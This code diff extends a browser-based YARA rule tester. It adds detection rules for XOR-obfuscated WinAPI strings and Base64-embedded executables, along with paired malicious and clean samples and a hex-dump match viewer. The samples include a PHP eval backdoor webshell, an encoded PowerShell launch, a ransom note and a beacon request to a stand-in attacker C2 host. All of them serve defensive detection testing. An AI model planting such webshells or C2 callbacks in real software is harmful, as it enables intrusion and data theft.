@@ -13,6 +13,27 @@ const TEMPLATES = {
     condition:
         $tag at 0 and ($eval or $b64) and $post
 }`,
+  xor: `rule XOR_Encoded_WinAPI_Stager : trojan obfuscation {
+    meta:
+        description = "Detects obfuscated payloads using single-byte XOR encoding on critical API strings"
+        severity = "high"
+    strings:
+        $virtual_alloc = "VirtualAlloc" xor(0x01-0xff)
+        $create_thread = "CreateThread" xor(0x01-0xff)
+        $win_exec = "WinExec" xor(0x01-0xff)
+    condition:
+        any of them
+}`,
+  base64: `rule Base64_Embedded_Executable_Payload : dropper obfuscation {
+    meta:
+        description = "Detects Base64-encoded PE executable artifacts regardless of alignment"
+        severity = "critical"
+    strings:
+        $pe_msg = "This program cannot be run in DOS mode" base64
+        $bypass = "ExecutionPolicy Bypass" base64
+    condition:
+        any of them
+}`,
   powershell: `rule Suspicious_PowerShell_Cradle {
     meta:
         description = "Detects obfuscated PowerShell download cradles"
@@ -47,11 +68,33 @@ const TEMPLATES = {
 }`
 };
 
+function getXorVirtualAllocSample() {
+  const raw = "VirtualAlloc";
+  const key = 0x5a;
+  let s = "\x90\x90\xeb\x10";
+  for (let i = 0; i < raw.length; i++) {
+    s += String.fromCharCode(raw.charCodeAt(i) ^ key);
+  }
+  s += "\xcc\xc3";
+  return s;
+}
+
 const SAMPLES = {
   webshell_malicious: "<?php\n// Admin backdoor\n$data = $_POST['cmd'];\neval(base64_decode($data));\n?>",
   webshell_clean: "<?php\n// Standard application router\necho 'Welcome to production portal';\n?>",
+  xor_malicious: getXorVirtualAllocSample(),
+  xor_clean: "const harmless_buffer = new Uint8Array([0x00, 0x01, 0x02, 0x03, 0x04]);",
+  base64_malicious: `# PowerShell Dropper Emulation
+$stage2_blob = "UHJlZml4X1VucmVsYXRlZF9CeXRlc19UaGlzIHByb2dyYW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZV9TdWZmaXg=";
+$decompressed = [System.Convert]::FromBase64String($stage2_blob);`,
+  base64_clean: `# Clean developer script
+$log_message = "Standard task queue scheduler initialized successfully.";`,
   powershell_malicious: "C:\\Windows\\system32\\cmd.exe /c powershell.exe -NoProfile -enc SQBFAFgAKABOAGUAdwA=",
-  c2_malicious: "GET /api/v1/tasks?node=host-889 HTTP/1.1\r\nHost: c2.attacker.org\r\nUser-Agent: python-requests/2.28\r\n\r\n"
+  powershell_clean: "# PowerShell profile\nWrite-Host 'Welcome to administrative console'",
+  ransomware_malicious: "ATTENTION!\nAll your files have been encrypted by RSA-4096.\nSend 0.5 bitcoin to 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\nOr visit our darknet portal at decrypt7x2y4z.onion",
+  ransomware_clean: "System backup completed successfully at 2026-09-17 12:00:00. 100% integrity verified.",
+  c2_malicious: "GET /api/v1/tasks?node=host-889 HTTP/1.1\r\nHost: c2.attacker.org\r\nUser-Agent: python-requests/2.28\r\n\r\n",
+  c2_clean: "GET /healthz HTTP/1.1\r\nHost: internal-service.local\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n\r\n"
 };
 
 const ruleInput = document.getElementById("ruleInput");
@@ -79,33 +122,40 @@ try {
   engineStatus.style.color = "#f85149";
 }
 
-templateSelect.addEventListener("change", (e) => {
-  const key = e.target.value;
+function updateTemplateSelection(key) {
   if (TEMPLATES[key]) {
     ruleInput.value = TEMPLATES[key];
-    if (key === "powershell") {
-      sampleInput.value = SAMPLES.powershell_malicious;
-    } else if (key === "c2") {
-      sampleInput.value = SAMPLES.c2_malicious;
+    const malKey = `${key}_malicious`;
+    if (SAMPLES[malKey]) {
+      sampleInput.value = SAMPLES[malKey];
     } else {
       sampleInput.value = SAMPLES.webshell_malicious;
     }
   }
+}
+
+templateSelect.addEventListener("change", (e) => {
+  updateTemplateSelection(e.target.value);
 });
 
 document.getElementById("loadMaliciousSample").addEventListener("click", () => {
   const key = templateSelect.value;
-  if (key === "powershell") {
-    sampleInput.value = SAMPLES.powershell_malicious;
-  } else if (key === "c2") {
-    sampleInput.value = SAMPLES.c2_malicious;
+  const malKey = `${key}_malicious`;
+  if (SAMPLES[malKey]) {
+    sampleInput.value = SAMPLES[malKey];
   } else {
     sampleInput.value = SAMPLES.webshell_malicious;
   }
 });
 
 document.getElementById("loadCleanSample").addEventListener("click", () => {
-  sampleInput.value = SAMPLES.webshell_clean;
+  const key = templateSelect.value;
+  const cleanKey = `${key}_clean`;
+  if (SAMPLES[cleanKey]) {
+    sampleInput.value = SAMPLES[cleanKey];
+  } else {
+    sampleInput.value = SAMPLES.webshell_clean;
+  }
 });
 
 validateBtn.addEventListener("click", () => {
@@ -120,6 +170,79 @@ validateBtn.addEventListener("click", () => {
     alert("[-] 校验异常: " + err);
   }
 });
+
+function renderHexDump(bytes, matchedRanges) {
+  const container = document.getElementById("hexDumpContainer");
+  const hexMeta = document.getElementById("hexMeta");
+  container.innerHTML = "";
+
+  if (bytes.length === 0) {
+    container.innerHTML = '<div class="hex-dump-placeholder">待测目标数据为空</div>';
+    hexMeta.textContent = "0 字节";
+    return;
+  }
+
+  hexMeta.textContent = `总计 ${bytes.length} 字节 | 标定命中区间: ${matchedRanges.length} 个`;
+
+  const fragment = document.createDocumentFragment();
+  const chunkSize = 16;
+  const maxBytes = Math.min(bytes.length, 4096); // limit preview to first 4KB for responsive rendering
+
+  for (let i = 0; i < maxBytes; i += chunkSize) {
+    const row = document.createElement("div");
+    row.className = "hex-row";
+
+    const offsetEl = document.createElement("span");
+    offsetEl.className = "hex-offset";
+    offsetEl.textContent = "0x" + i.toString(16).padStart(8, "0");
+    row.appendChild(offsetEl);
+
+    const bytesEl = document.createElement("div");
+    bytesEl.className = "hex-bytes";
+
+    const asciiEl = document.createElement("span");
+    asciiEl.className = "hex-ascii";
+
+    for (let j = 0; j < chunkSize; j++) {
+      const idx = i + j;
+      if (idx < maxBytes) {
+        const b = bytes[idx];
+        const isMatched = matchedRanges.some(r => idx >= r.start && idx < r.end);
+
+        const byteSpan = document.createElement("span");
+        byteSpan.className = "hex-byte" + (isMatched ? " matched" : "");
+        byteSpan.textContent = b.toString(16).padStart(2, "0").toUpperCase();
+        bytesEl.appendChild(byteSpan);
+
+        const asciiSpan = document.createElement("span");
+        asciiSpan.className = isMatched ? "hex-ascii-char matched" : "hex-ascii-char";
+        const char = (b >= 32 && b <= 126) ? String.fromCharCode(b) : ".";
+        asciiSpan.textContent = char;
+        asciiEl.appendChild(asciiSpan);
+      } else {
+        const byteSpan = document.createElement("span");
+        byteSpan.className = "hex-byte";
+        byteSpan.textContent = "  ";
+        bytesEl.appendChild(byteSpan);
+      }
+    }
+
+    row.appendChild(bytesEl);
+    row.appendChild(asciiEl);
+    fragment.appendChild(row);
+  }
+
+  if (bytes.length > maxBytes) {
+    const notice = document.createElement("div");
+    notice.style.color = "#8b949e";
+    notice.style.padding = "8px";
+    notice.style.textAlign = "center";
+    notice.textContent = `... 已截断显示（显示前 ${maxBytes} 字节，总计 ${bytes.length} 字节）`;
+    fragment.appendChild(notice);
+  }
+
+  container.appendChild(fragment);
+}
 
 scanBtn.addEventListener("click", () => {
   const ruleSrc = ruleInput.value;
@@ -136,6 +259,10 @@ scanBtn.addEventListener("click", () => {
       return;
     }
 
+    // Convert string to bytes for hex dump inspection
+    const bytes = new Uint8Array(new TextEncoder().encode(sampleText));
+    const matchedRanges = [];
+
     if (report.matches_count > 0) {
       matchSummary.textContent = `检出 ${report.matches_count} 条威胁规则命中！`;
       matchSummary.style.color = "#f85149";
@@ -151,6 +278,7 @@ scanBtn.addEventListener("click", () => {
         formatted += `    匹配字符串清单:\n`;
         for (const s of m.strings) {
           formatted += `      - 标识: ${s.id} | 偏移量: ${s.offset} | 匹配长度: ${s.length}\n`;
+          matchedRanges.push({ start: s.offset, end: s.offset + s.length });
         }
         formatted += "\n";
       }
@@ -161,6 +289,8 @@ scanBtn.addEventListener("click", () => {
       matchSummary.style.color = "#3fb950";
       reportOutput.textContent = `[+] 扫描完成：目标数据 (${report.size} 字节) 未命中任何已配置的规则特征。`;
     }
+
+    renderHexDump(bytes, matchedRanges);
   } catch (err) {
     reportOutput.textContent = "扫描执行异常: " + err;
   }
